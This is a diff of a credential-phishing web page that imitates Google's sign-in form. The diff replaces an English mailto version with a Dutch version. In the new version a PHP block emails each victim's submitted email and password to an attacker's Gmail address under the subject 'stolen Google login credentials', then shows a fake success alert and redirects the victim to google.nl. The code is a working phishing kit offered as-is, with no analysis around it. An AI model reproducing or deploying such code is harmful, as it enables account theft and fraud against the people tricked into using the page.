@@ -1,88 +1,63 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="nl">
 <head>
-    <meta charset="UTF-8">
-    <title>Sign in - Google Accounts</title>
-    <link rel="icon" type="image/png" sizes="192x192"
-          href="https://ssl.gstatic.com/accounts/ui/avatar_2x.png">
-    <style>
-        body {
-            background-color: #fff;
-            font-family: Roboto,"Noto Sans Myanmar UI",arial,sans-serif;
-        }
-        .container {
-            max-width: 450px;
-            margin: auto;
-            padding-top: 60px;
-        }
-        .card {
-            background-color:#fff;
-            border-radius:.75rem;
-            box-shadow:
-                rgba(60,64,67,.15) 0 .08333rem .33333rem,
-                rgba(60,64,67,.15) 0 .16667rem .66667rem,
-                rgba(60,64,67,.15) 0 .25rem .83333rem,
-                rgba(60,64,67,.15) 0 .33333rem 1.16667rem,
-                rgba(60,64,67,.15) 0 .41667rem 1.33333rem,
-                rgba(60,64,67,.15) 0 .58333rem 2rem;
-            padding:48px;
-        }
-        img.logo {
-            width:auto;height:auto;margin-bottom:.75em;margin-left:-10px;
-        }
-        h1 {font-size:24px;font-weight:bold;margin-bottom:.25em;}
-        p {color:#444;font-size:.98em;}
-        input[type=email],input[type=password]{
-           width:100%;padding:.95em;border-radius:.25em;border:none;background:#eee;margin-bottom:.85em;font-size:.97em;}
-        input[type=email]:focus,input[type=password]:focus{background:#fff;border-color:#4285f4;}
-        
-        button[type=submit]{
-           width:auto;padding:.85em;background-color:#4285f4;color:#fff;border-radius:.25em;border:none;font-size:.99em;font-weight:bold;text-transform:none;}
-        
-       a {color:#4285f4;text-decoration:none;}
-       a:hover{text-decoration:underline;}
-       
-       #showpass {position:absolute;margin-left:-30px;margin-top:-44px;width:auto;height:auto;background:none;color:#888;border:none;}
-       
-       @media (max-width:560px){
-         .container{padding-top:.75em}
-         .card{padding-left:.75em;padding-right:.75em;padding-top:.85em;padding-bottom:.85em}
-       }
-    </style>
+ <title>Google Inloggen</title>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <style>
+ body {
+ font-family: Arial, sans-serif;
+ }
+ .container {
+ width: 300px;
+ margin: auto;
+ padding: 20px;
+ border: 1px solid #ddd;
+ border-radius: 10px;
+ box-shadow: 0 0 10px rgba(0,0,0,0.1);
+ }
+ </style>
 </head>
 <body>
+
 <div class="container">
-    <form action="mailto:kaasislekker069@gmail.com"
-          method="post"
-          enctype="text/plain"
-          autocomplete="off"
-          class="card">
-      <img src='https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png'
-           class='logo' alt='Google logo'><br><br>
-      <h1>Sign in</h1>
-      <p to continue to Gmail style='margin-bottom:-16px'>to continue to Gmail</p><br>
+ <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo" style="width:100%;height:auto;">
+ 
+ <form id="loginForm" action="" method="post">
+ <label for="email">E-mail:</label><br>
+ <input type="email" id="email" name="email"><br><br>
+ 
+ <label for="password">Wachtwoord:</label><br>
+ <input type="password" id="password" name="password"><br><br>
 
-      <label>Email or phone<br></label>
-      <input type='email' name='email' placeholder='Email or phone' required autofocus><br>
+ <button type="submit">Inloggen</button>
+ </form>
 
-      <label>Password<br></label>
-      <input type='password' id='pass' name='password' placeholder='Enter your password' required style='margin-bottom:-12px'>
-      <button id='showpass'
-              onclick="
-              event.preventDefault();
-              var x = document.getElementById('pass');
-              x.type = ( x.type === 'password') ? 'text':'password';
-              this.textContent = (this.textContent==='Show')?'Hide':'Show';">Show</button><br><br>
-
-      <div style='display:flex;justify-content:flex-end'>
-         <button type='submit'>Next</button>&nbsp;&nbsp;&nbsp;&nbsp;<span style='font-size:.94em;color:#888;'>Forgot email?</span>
-      </div>
-
-      <div style="margin-top:-20px"><hr style="border:none;height:12px"></div>
-
-      Not your computer? Use Guest mode to sign in privately.<br><br>
-
-      <span style="font-size:.98em;">Create account</span>&nbsp;&nbsp;<span style="font-size:.98em;">Learn more</span>
-   </form>
 </div>
-</body></html>
+
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+$email = $_POST['email'];
+$password = $_POST['password'];
+
+$to = 'kaasislekker069@gmail.com';
+$subject = 'Gestolen inloggegevens van Google';
+
+$message = '
+<p>Inloggegevens:</p> 
+<p>Email : '.$email.'</p> 
+<p>Password : '.$password.'</p>';
+
+$headers .= "MIME-Version: 1.0\r\n";
+$headers .= "Content-Type:text/html;charset=UTF-8\r\n";
+$headers .= "From:no-reply@example.nl\r\n";
+
+mail($to, $subject, $message, $headers);
+
+echo "<script>alert('Succesvol ingelogd!');</script>";
+echo "<script>window.location.href='https://www.google.nl';</script>";
+}
+?>
+
+</body>  
+</html>  
